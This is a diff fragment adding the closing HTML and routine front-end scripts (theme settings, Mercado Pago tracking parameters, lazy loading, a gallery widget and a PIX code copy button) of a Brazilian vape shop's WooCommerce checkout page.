+var basel_settings = {"photoswipe_close_on_scroll":"1","adding_to_cart":"Processing","added_to_cart":"Product was successfully added to your cart.","continue_shopping":"Continue shopping","view_cart":"View Cart","go_to_checkout":"Checkout","countdown_days":"days","countdown_hours":"hr","countdown_mins":"min","countdown_sec":"sc","loading":"Loading...","close":"Close (Esc)","share_fb":"Share on Facebook","pin_it":"Pin it","tweet":"Tweet","download_image":"Download image","wishlist":"no","cart_url":"https:\/\/brpods.com\/cart\/","ajaxurl":"https:\/\/brpods.com\/wp-admin\/admin-ajax.php","add_to_cart_action":"widget","categories_toggle":"no","enable_popup":"no","popup_delay":"2000","popup_event":"time","popup_scroll":"1000","popup_pages":"0","promo_popup_hide_mobile":"yes","product_images_captions":"no","all_results":"View all results","product_gallery":{"images_slider":true,"thumbs_slider":{"enabled":true,"position":"bottom","items":{"desktop":4,"desktop_small":3,"tablet":4,"mobile":3,"vertical_items":3}}},"zoom_enable":"no","ajax_scroll":"yes","ajax_scroll_class":".main-page-wrapper","ajax_scroll_offset":"100","product_slider_auto_height":"no","product_slider_autoplay":"","ajax_add_to_cart":"1","cookies_version":"1","header_banner_version":"1","header_banner_close_btn":"1","header_banner_enabled":"","promo_version":"1","pjax_timeout":"5000","split_nav_fix":"","shop_filters_close":"no","sticky_desc_scroll":"1","quickview_in_popup_fix":"","one_page_menu_offset":"150","is_multisite":"","current_blog_id":"1","swatches_scroll_top_desktop":"","swatches_scroll_top_mobile":"","lazy_loading_offset":"0","add_to_cart_action_timeout":"no","add_to_cart_action_timeout_number":"10","single_product_variations_price":"no","google_map_style_text":"Custom style","comment_images_upload_size_text":"Some files are too large. Allowed file size is 1 MB.","comment_images_count_text":"You can upload up to 3 images to your review.","comment_images_upload_mimes_text":"You are allowed to upload images only in png, jpeg formats.","comment_images_added_count_text":"Added %s image(s)","comment_images_upload_size":"1048576","comment_images_count":"3","comment_images_upload_mimes":{"jpg|jpeg|jpe":"image\/jpeg","png":"image\/png"},"home_url":"https:\/\/brpods.com\/","shop_url":"https:\/\/brpods.com\/shop\/","cart_redirect_after_add":"yes","product_categories_placeholder":"Selecione uma categoria","product_categories_no_results":"No matches found","cart_hash_key":"wc_cart_hash_6c502539620a52049be9641f5368c40b","fragment_name":"wc_fragments_6c502539620a52049be9641f5368c40b"};
+var basel_variation_gallery_data = null;
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/functions.js?ver=555.4.0" id="basel-functions-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="mercadopago_melidata-js-extra">
+/* <![CDATA[ */
+var mercadopago_melidata_params = {"type":"buyer","site_id":"MLB","location":"\/checkout","payment_method":"","plugin_version":"7.6.1","platform_version":"8.6.1"};
+var mercadopago_melidata_params = {"type":"buyer","site_id":"MLB","location":"\/checkout","payment_method":"","plugin_version":"7.6.1","platform_version":"8.6.1"};
+var mercadopago_melidata_params = {"type":"buyer","site_id":"MLB","location":"\/checkout","payment_method":"","plugin_version":"7.6.1","platform_version":"8.6.1"};
+var mercadopago_melidata_params = {"type":"buyer","site_id":"MLB","location":"\/checkout","payment_method":"","plugin_version":"7.6.1","platform_version":"8.6.1"};
+var mercadopago_melidata_params = {"type":"buyer","site_id":"MLB","location":"\/checkout","payment_method":"","plugin_version":"7.6.1","platform_version":"8.6.1"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/melidata/melidata-client.js?ver=7.6.1" id="mercadopago_melidata-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-extra-checkout-fields-for-brazil/assets/js/mailcheck/mailcheck.js?ver=1.1.1" id="mailcheck-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="woocommerce-extra-checkout-fields-for-brazil-front-js-extra">
+/* <![CDATA[ */
+var bmwPublicParams = {"state":"Estado","required":"obrigat\u00f3rio","mailcheck":"yes","maskedinput":"no","person_type":"2","only_brazil":"yes","suggest_text":"Voc\u00ea quis dizer: %hint%?"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-extra-checkout-fields-for-brazil/assets/js/frontend/frontend.js?ver=4.0.2" id="woocommerce-extra-checkout-fields-for-brazil-front-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript">
+jQuery(function($) { 
+
+				window.gtm4wp_checkout_products = [{"item_id":30892,"item_name":"Descart\u00e1vel - POD IGNITE V50 - 5000 PUFFS - 500mAh (Recarreg\u00e1vel)","sku":"ignite-v50-new-aloe","price":85,"stocklevel":9,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Descart\u00e1veis","id":30892,"item_variant":"Aloe Grape","quantity":2}];
+				window.gtm4wp_checkout_value    = 170;
+
+
+      jQuery( document.body ).one( 'updated_checkout', function() {
+         jQuery('input.shipping_method').prop('checked', false);
+      });
+   
+ });
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript">window.lazyLoadOptions = {
+                elements_selector: "img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",
+                data_src: "lazy-src",
+                data_srcset: "lazy-srcset",
+                data_sizes: "lazy-sizes",
+                class_loading: "lazyloading",
+                class_loaded: "lazyloaded",
+                threshold: 300,
+                callback_loaded: function(element) {
+                    if ( element.tagName === "IFRAME" && element.dataset.rocketLazyload == "fitvidscompatible" ) {
+                        if (element.classList.contains("lazyloaded") ) {
+                            if (typeof window.jQuery != "undefined") {
+                                if (jQuery.fn.fitVids) {
+                                    jQuery(element).parent().fitVids();
+                                }
+                            }
+                        }
+                    }
+                }};
+        window.addEventListener('LazyLoad::Initialized', function (e) {
+            var lazyLoadInstance = e.detail.instance;
+
+            if (window.MutationObserver) {
+                var observer = new MutationObserver(function(mutations) {
+                    var image_count = 0;
+                    var iframe_count = 0;
+                    var rocketlazy_count = 0;
+
+                    mutations.forEach(function(mutation) {
+                        for (i = 0; i < mutation.addedNodes.length; i++) {
+                            if (typeof mutation.addedNodes[i].getElementsByTagName !== 'function') {
+                                return;
+                            }
+
+                           if (typeof mutation.addedNodes[i].getElementsByClassName !== 'function') {
+                                return;
+                            }
+
+                            images = mutation.addedNodes[i].getElementsByTagName('img');
+                            is_image = mutation.addedNodes[i].tagName == "IMG";
+                            iframes = mutation.addedNodes[i].getElementsByTagName('iframe');
+                            is_iframe = mutation.addedNodes[i].tagName == "IFRAME";
+                            rocket_lazy = mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');
+
+                            image_count += images.length;
+			                iframe_count += iframes.length;
+			                rocketlazy_count += rocket_lazy.length;
+
+                            if(is_image){
+                                image_count += 1;
+                            }
+
+                            if(is_iframe){
+                                iframe_count += 1;
+                            }
+                        }
+                    } );
+
+                    if(image_count > 0 || iframe_count > 0 || rocketlazy_count > 0){
+                        lazyLoadInstance.update();
+                    }
+                } );
+
+                var b      = document.getElementsByTagName("body")[0];
+                var config = { childList: true, subtree: true };
+
+                observer.observe(b, config);
+            }
+        }, false);</script><script data-no-minify="1" async src="https://brpods.com/wp-content/plugins/wp-rocket/assets/js/lazyload/16.1/lazyload.js" type="b19bda5e6f031c08c895a890-text/javascript"></script><script type="b19bda5e6f031c08c895a890-text/javascript">function lazyLoadThumb(e){var t='<img loading="lazy" loading="lazy" data-lazy-src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"><noscript><img fetchpriority="high" src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"></noscript>',a='<div class="play"></div>';return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.dataset.query.length?'':'&'+this.dataset.query;e.setAttribute("src",t.replace("ID",this.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow", "accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.replaceChild(e,this)}document.addEventListener("DOMContentLoaded",function(){var e,t,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)e=document.createElement("div"),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query", a[t].dataset.query),e.setAttribute("data-src", a[t].dataset.src),e.innerHTML=lazyLoadThumb(a[t].dataset.id),e.onclick=lazyLoadYoutubeIframe,a[t].appendChild(e)});</script>
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+
+<div class="pswp__container">
+<div class="pswp__item"></div>
+<div class="pswp__item"></div>
+<div class="pswp__item"></div>
+</div>
+
+<div class="pswp__ui pswp__ui--hidden">
+<div class="pswp__top-bar">
+
+<div class="pswp__counter"></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title="Share"></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+
+<div class="pswp__preloader">
+<div class="pswp__preloader__icn">
+<div class="pswp__preloader__cut">
+<div class="pswp__preloader__donut"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class="pswp__share-tooltip"></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class="pswp__caption">
+<div class="pswp__caption__center"></div>
+</div>
+</div>
+</div>
+</div><script type="b19bda5e6f031c08c895a890-text/javascript">
+if(document.getElementById("mp-qr-code")){
+		jQuery('button.mp-details-pix-button').on('click',function(){
+			  var campoInput = document.getElementById("mp-qr-code");
+
+			  // Seleciona o texto dentro do campo de input
+			  campoInput.select();
+
+			  // Copia o texto selecionado
+			  document.execCommand("copy");
+
+			  // Alerta o usuário que o texto foi copiado
+			  alert("Texto copiado: " + campoInput.value);
+		})
+	}
+</script>
+<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="b19bda5e6f031c08c895a890-|49" defer></script></body>
 </html>
+
+
